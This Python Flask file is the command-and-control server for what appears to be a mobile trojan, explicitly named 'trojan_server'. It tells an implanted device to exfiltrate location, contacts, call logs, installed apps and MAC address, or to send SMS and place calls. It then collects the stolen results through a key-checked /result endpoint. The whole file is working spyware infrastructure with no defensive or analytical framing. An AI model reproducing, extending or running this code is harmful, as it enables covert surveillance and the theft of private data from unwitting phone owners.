from flask import Flask, request, make_response, abort, Response
from OpenSSL import SSL
import sys
import time
import sys
import getopt
import argparse
import os
import signal
import json
import hashlib
import logging


KEY = 'LOL' + '8df639b301a1e10c36cc2f03bbdf8863'

if os.path.isfile('ssl/app.crt') and os.path.isfile('ssl/app.key'):  
	#ssl = SSL.Context(SSL.SSLv23_METHOD)
	#ssl.use_privatekey_file('ssl/app.key')
	#ssl.use_certificate_file('ssl/app.crt')
	ssl = ('ssl/app.crt', 'ssl/app.key')
else:
	ssl = False

class parse_args:
	def __init__(self):
		self.parser = argparse.ArgumentParser(description='ACTION')
		self.parser.add_argument('--location', dest='location', action='store_true', default=False,
                   help='get Location')
		self.parser.add_argument('--contacts', dest='contacts', action='store_true', default=False,
                   help='get Contacts')
		self.parser.add_argument('--calllogs', dest='calllogs', action='store_true', default=False,
                   help='Get calllogs')
		self.parser.add_argument('--packages', dest='packages', action='store_true', default=False,
                   help='get installed packages')
		self.parser.add_argument('--mac', dest='mac', action='store_true', default=False,
                   help='get Mac address')
		self.parser.add_argument('--sendsms', dest='sendsms', action='store', metavar=('PhoneNumber', 'Message'), nargs=2, default=False,
                   help='Send SMS')
		self.parser.add_argument('--call', dest='call', action='store', metavar=('PhoneNumber', 'calltime'), nargs=2, default=False,
                   help='call a number for X millisecondes')
		self.parser.add_argument('-v', '--verbose', dest='verbose', action='store_true', default=False,
                   help='verbose')
		self.args = self.parser.parse_args()

	def getargs(self):
		return self.args


class trojan_server():
	def __init__(self, app, host, port, args, ssl=False):
		self.app = app
		self.host = host
		self.port = port
		self.args = args
		self.ssl=ssl
		self.null = 'null'
		self.excludeargs = ['verbose']
		self.nullaction = False
		self.route()

	def route(self):
		self.app.add_url_rule('/' , view_func=self.default, methods=['GET',])
		self.app.add_url_rule('/action' , view_func=self.action, methods=['GET',])
		self.app.add_url_rule('/result' , view_func=self.result, methods=['POST',])

	def start(self):
		if self.args.verbose == False:
			logging.getLogger('werkzeug').setLevel(logging.ERROR)

		
		if self.ssl == False:
			self.app.run(host=self.host, port=self.port, debug=self.args.verbose)
		else:
			self.app.run(host=self.host, port=self.port, ssl_context=self.ssl, debug=self.args.verbose)
			
			

	def default(self):
  		return 'hello'

	def action(self):
		for arg, value in sorted(vars(self.args).items()):
			if value != False and self.nullaction != True and arg not in self.excludeargs:
				return Response(json.dumps({arg: value}), status=200, mimetype='application/json')
		return self.null
	
	def result(self):
		sha1 = hashlib.sha1()
		sha1.update(KEY)

		if request.headers.get('Authorization') == sha1.hexdigest():
			try:
				resultjson = json.dumps(request.get_json(), indent=3, sort_keys=True, encoding="utf-8")
				print(request.remote_addr)
				print(resultjson)
			except:
				print(request.remote_addr)
				print(str(request.data))
			
			nullaction = True
			self.stop()
			return Response(self.null, status=200)
		else:
			print(request.remote_addr + "Wrong KEY")
			return Response(self.null, status=401)
		

	def stop(self):
		func = request.environ.get('werkzeug.server.shutdown')
		if func is None:
		    raise RuntimeError('Not running with the Werkzeug Server')
		func()

if __name__ == '__main__':
	app = Flask(__name__)
	server = trojan_server(app=app, host='192.168.2.3', port=8080, args=parse_args().getargs(), ssl=ssl)
	#server = trojan_server(app=app, host='192.168.1.79', port=8080, args=parse_args().getargs())	
	server.start()
